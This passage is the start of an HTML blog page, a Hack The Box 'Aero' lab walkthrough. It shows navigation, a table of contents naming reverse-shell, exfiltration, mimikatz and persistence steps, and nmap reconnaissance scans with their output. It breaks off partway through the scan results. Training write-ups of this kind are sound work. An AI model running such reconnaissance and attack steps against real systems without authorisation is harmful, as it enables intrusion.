@@ -1,0 +1,2019 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.137.1">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Aero HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Aero HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/certified-box/" title="./certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Aero HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.05.11"
+                            >2024.05.11
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        16 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/medium/"
+                            class="tag-btn">
+                            Medium
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2023-38146/"
+                            class="tag-btn">
+                            CVE-2023-38146
+                        </a>
+                    
+                        <a
+                            href="/tags/themebleed/"
+                            class="tag-btn">
+                            ThemeBleed
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2023-28252/"
+                            class="tag-btn">
+                            CVE-2023-28252
+                        </a>
+                    
+                        <a
+                            href="/tags/persistence/"
+                            class="tag-btn">
+                            Persistence
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/aero-box/" class="bread-btn">
+    
+
+    
+        
+            Aero HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#aero-hack-the-box-walkthrough-writeup">Aero Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#web-80">Web <code>80</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#building-the-themebleed-cve-2023-38146-reverse-shell-dll">Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL:</a></li>
+        <li><a href="#running-the-themebleed-exploit-to-get-a-reverse-shell">Running the ThemeBleed Exploit to get a reverse shell:</a></li>
+        <li><a href="#enumerating-as-sam-dot-emerson">Enumerating as sam.emerson:</a></li>
+        <li><a href="#exfiltrating-the-cve-2023-28252-summary-dot-pdf-using-base64-encoding">Exfiltrating the CVE-2023-28252_Summary.pdf using base64 encoding:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#researching-cve-2023-28252--clfs--vulnerability">Researching CVE-2023-28252 (CLFS) Vulnerability:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-persistence">4. Persistence:</a>
+      <ul>
+        <li><a href="#trying-to-dump-creds-with-mimikatz">Trying to dump creds with mimikatz:</a></li>
+        <li><a href="#using-invoke-mimikatz-dot-ps1-with-a-download-cradle-to-dump-hashes">Using invoke-mimikatz.ps1 with a download cradle to dump hashes:</a></li>
+        <li><a href="#creating-a-new-user-who-is-part-of-the-administrators-group">Creating a new user who is part of the administrators group:</a></li>
+        <li><a href="#living-off-the-land-persistence">Living off the land persistence:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="aero-hack-the-box-walkthrough-writeup">Aero Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Aero">https://app.hackthebox.com/machines/Aero</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li>
+<p><strong>Basic TCP Scan</strong>:</p>
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Aero/scans/nmap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2008:23:39%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-04%2008:23%20GMT%0aNmap%20scan%20report%20for%2010.129.229.128%0aHost%20is%20up%20%280.036s%20latency%29.%0aNot%20shown:%20999%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20STATE%20SERVICE%0a80/tcp%20open%20%20http%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%205.29%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 08:23:39 zsh ❯ nmap $box -Pn -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-04 08:23 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 5.29 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>Well looks like we are checking out the webserver….</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Basic UDP Scan</strong>:</p>
+<ul>
+<li><code>sudo nmap $box -sU -Pn -oA UDPbasicScan</code></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Aero/scans/nmap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2008:23:55%20zsh%20%e2%9d%af%20sudo%20nmap%20$box%20-sU%20-Pn%20-oA%20UDPbasicScan%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-04%2008:24%20GMT%0aStats:%200:01:53%20elapsed;%200%20hosts%20completed%20%281%20up%29,%201%20undergoing%20UDP%20Scan%0aUDP%20Scan%20Timing:%20About%2056.00%25%20done;%20ETC:%2008:27%20%280:01:29%20remaining%29%0aNmap%20scan%20report%20for%2010.129.229.128%0aHost%20is%20up.%0aAll%201000%20scanned%20ports%20on%2010.129.229.128%20are%20in%20ignored%20states.%0aNot%20shown:%201000%20open%7cfiltered%20udp%20ports%20%28no-response%29%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20201.42%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 08:23:55 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-04 08:24 GMT
+</span></span><span style="display:flex;"><span>Stats: 0:01:53 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing UDP Scan
+</span></span><span style="display:flex;"><span>UDP Scan Timing: About 56.00% <span style="color:#66d9ef">done</span>; ETC: 08:27 <span style="color:#f92672">(</span>0:01:29 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.128
+</span></span><span style="display:flex;"><span>Host is up.
+</span></span><span style="display:flex;"><span>All <span style="color:#ae81ff">1000</span> scanned ports on 10.129.229.128 are in ignored states.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1000</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 201.42 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>Nothing additional being run on the UDP side.</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li>
+<p><strong>In depth scan TCP</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Aero/scans/nmap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%203m25s%0a%f0%9f%95%99%2008:27:36%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-04%2008:30%20GMT%0aNmap%20scan%20report%20for%2010.129.229.128%0aHost%20is%20up%20%280.040s%20latency%29.%0aNot%20shown:%2065534%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20STATE%20SERVICE%20VERSION%0a80/tcp%20open%20%20http%20%20%20%20Microsoft%20IIS%20httpd%2010.0%0a%7c_http-server-header:%20Microsoft-IIS/10.0%0a%7c_http-title:%20Aero%20Theme%20Hub%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%2011%20%2888%25%29%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%2011%2021H2%20%2888%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20175.09%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 3m25s
+</span></span><span style="display:flex;"><span>🕙 08:27:36 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-04 08:30 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 10.0
